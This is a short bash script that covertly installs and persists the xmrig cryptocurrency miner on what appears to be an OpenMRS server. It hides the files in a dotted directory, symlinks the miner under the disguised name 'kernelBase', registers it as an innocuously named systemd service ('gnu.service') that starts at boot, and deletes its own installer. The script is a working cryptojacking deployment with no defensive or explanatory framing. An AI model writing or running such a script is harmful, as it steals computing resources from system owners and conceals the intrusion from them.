#! /usr/bin/bash

sudo mkdir -p /home/openmrs/.gnu
sudo mv /home/openmrs/gnu/* /home/openmrs/.gnu
sudo rm -R /home/openmrs/gnu

cd /home/openmrs/.gnu || exit

sudo chmod +x xmrig
sudo ln -sf /home/openmrs/.gnu/xmrig kernelBase

# Generate date-time
NOW=$(date "+%Y%m%d_%H%M%S")

# Replace .laptop
sed -i "s|\.another|.$NOW|g" gnu.service

# Show result (debug)
echo "---- Modified gnu.service ----"
cat gnu.service
echo "-----------------------------"

# Move service
sudo mv gnu.service /etc/systemd/system/

sudo chmod 664 /etc/systemd/system/gnu.service
sudo systemctl daemon-reload
sudo systemctl enable gnu.service
sudo systemctl restart gnu.service

sudo rm run_me.sh
